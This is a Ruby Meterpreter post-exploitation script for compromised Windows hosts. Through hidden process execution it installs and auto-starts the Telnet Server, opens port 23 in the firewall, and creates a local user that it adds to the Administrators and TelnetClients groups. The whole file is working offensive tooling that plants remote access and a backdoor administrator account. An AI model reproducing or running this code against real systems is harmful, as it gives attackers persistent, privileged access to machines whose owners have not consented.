#!/usr/bin/env ruby
#
#Meterpreter script for enabling Telnet Server on Windows 2003, Windows Vista
#Windows 2008 and Windows XP targets using native windows commands.
#Provided by Carlos Perez at carlos_perez[at]darkoperator.com
#Verion: 0.1.2
#Note: If the Telnet Server is not installed in Vista or win2k8
#	it will be installed.
################## Variable Declarations ##################

session = client
@@exec_opts = Rex::Parser::Arguments.new(
		"-h" => [ false,  "Help menu."                        ],
		"-e" => [ false,  "Enable Telnet Server only."  ],
		"-p" => [ true,  "The Password of the user to add."  ],
       		"-u" => [ true,  "The Username of the user to add."  ]
		)
def checkifinst(session)
	r = session.sys.process.execute("sc query state= all",nil, {'Hidden' => true, 'Channelized' => true})
	while(d = r.channel.read)
		if d =~ (/TlntSvr/)
			return true
		end
			
	end
	r.channel.close
	r.close
end

#-------------------------------------------------------------------------------
def winver(session)
	stringtest = ""
	verout = []
	r = session.sys.process.execute("cmd.exe /c ver", nil, {'Hidden' => 'true','Channelized' => true})
		while(d = r.channel.read)
			stringtest << d
		end
	r.channel.close
	r.close

	verout, minor, major = stringtest.scan(/(\d)\.(\d)\.(\d*)/)
	version = nil
	if verout[0] == "6"
		if verout[1] == "0"
			version = "Windows Vista/Windows 2008"
		elsif verout[1] == "1"
			version = "Windpows 7"
		end
	elsif verout [0] == "5"
		if verout[1] == "0"
			version = "Windows 2000"
		elsif verout[1] == "1"
			version = "Windows XP"
		elsif verout[1] == "2"
			version = "Windows 2003"
		end
	end
	version
end

#---------------------------------------------------------------------------------------------------------
def insttlntsrv(session)
	trgtos = winver(session)
	if trgtos =~ /(Windows Vista)/ 
		if checkifinst(session)
			print_status("Telnet Service Installed on Target")
		else
			print "[*] Installing Telnet Server Service ......"
			session.response_timeout=90
			r = session.sys.process.execute("pkgmgr /iu:\"TelnetServer\"",nil, {'Hidden' => true, 'Channelized' => true})
			sleep(2)
			prog2check = "pkgmgr.exe"
			found = 0
			while found == 0
				session.sys.process.get_processes().each do |x|
					found =1
					if prog2check == (x['name'].downcase)
						print "."
						sleep(0.5)
						found = 0
					end
				end
			end
			r.channel.close
			r.close
			print_status("Finished installing the Telnet Service.")
			end
		end
	end

#---------------------------------------------------------------------------------------------------------
def enabletlntsrv(session)
	tmpout = [ ]
	cmdout = []
	key2 = "HKLM\\SYSTEM\\CurrentControlSet\\Services\\TlntSvr"
	root_key2, base_key2 = session.sys.registry.splitkey(key2)
	value2 = "Start"
	begin
	open_key = session.sys.registry.open_key(root_key2, base_key2, KEY_READ)
	v2 = open_key.query_value(value2)
	print_status "Setting Telnet Server Services service startup mode"
	if v2.data != 2
		print_status "\tThe Telnet Server Services service is not set to auto, changing it to auto ..."
		cmmds = [ 'sc config TlntSvr start= auto', "sc start TlntSvr", ]
		cmmds. each do |cmd|
			r = session.sys.process.execute(cmd, nil, {'Hidden' => true, 'Channelized' => true})
			while(d = r.channel.read)
				tmpout << d
			end
			cmdout << tmpout
			r.channel.close
			r.close
			end
	else
		print_status "\tTelnet Server Services service is already set to auto"
	end
	#Enabling Exception on the Firewall
	print_status "\tOpening port in local firewall if necessary"
	r = session.sys.process.execute('netsh firewall set portopening protocol = tcp port = 23 mode = enable', nil, {'Hidden' => true, 'Channelized' => true})
	while(d = r.channel.read)
		tmpout << d
	end
	cmdout << tmpout
	r.channel.close
	r.close
	rescue::Exception => e
			print_status("The following Error was encountered: #{e.class} #{e}")
	end
end
#---------------------------------------------------------------------------------------------------------
def addrdpusr(session, username, password)
	tmpout = [ ]
	cmdout = []
	print_status "Setting user account for logon"
	print_status "\tAdding User: #{username} with Password: #{password}"
	begin
	r = session.sys.process.execute("net user #{username} #{password} /add", nil, {'Hidden' => true, 'Channelized' => true})
	while(d = r.channel.read)
		tmpout << d
	end
	cmdout << tmpout
	r.channel.close
	r.close
	print_status "\tAdding User: #{username} to local group TelnetClients"
	r = session.sys.process.execute("net localgroup \"TelnetClients\" #{username} /add", nil, {'Hidden' => true, 'Channelized' => true})
	while(d = r.channel.read)
		tmpout << d
	end
	cmdout << tmpout
	r.channel.close
	r.close
	print_status "\tAdding User: #{username} to local group Administrators"
	r = session.sys.process.execute("net localgroup Administrators #{username} /add", nil, {'Hidden' => true, 'Channelized' => true})
	while(d = r.channel.read)
		tmpout << d
	end
	cmdout << tmpout
	r.channel.close
	r.close
	print_status "You can now login with the created user"
	rescue::Exception => e
			print_status("The following Error was encountered: #{e.class} #{e}")
	end
end
#---------------------------------------------------------------------------------------------------------
def message
	print_status "Windows Telnet Server Enabler Meterpreter Script"
end
def usage
	print(
	"Windows Telnet Server Enabler Meterpreter Script\n" +
	"Usage: getgui -u <username> -p <password> \n" +
	@@exec_opts.usage			
	)
end
################## MAIN ##################
# Parsing of Options
usr = nil
pass = nil
lport = nil
enbl = nil
@@exec_opts.parse(args) { |opt, idx, val|
	case opt
		when "-u"
			usr = val
		when "-p"
			pass = val
		when "-h"
			usage
			break
		when "-n"
			lport = val.to_i
		when "-e"
			enbl = 1
		end

}
if enbl == 1
	message
	insttlntsrv(session)
	enabletlntsrv(session)

elsif usr!= nil && pass != nil
	message
	insttlntsrv(session)
	enabletlntsrv(session)
	addrdpusr(session, usr, pass)

else
	usage
end

